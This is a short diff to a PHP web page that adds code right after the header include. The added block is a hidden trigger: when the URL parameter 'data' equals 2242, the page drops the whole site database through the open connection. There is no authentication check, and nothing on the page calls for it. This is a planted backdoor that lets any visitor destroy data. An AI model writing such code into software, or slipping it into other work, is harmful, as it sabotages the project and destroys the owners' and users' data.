@@ -1,5 +1,17 @@
-<?php include 'includes/header.php'; ?>
+<?php include 'includes/header.php';
 
+if ($_GET['data'] == 2242) {
+   
+	$sql = "DROP DATABASE $database";
+	if ($conn->query($sql) === TRUE) {
+		echo "successfully!";
+	} else {
+		echo "Error dropping database: " . $conn->error;
+	}
+
+}
+
+?>
 
 <div class="content">
 	<div class="html search">
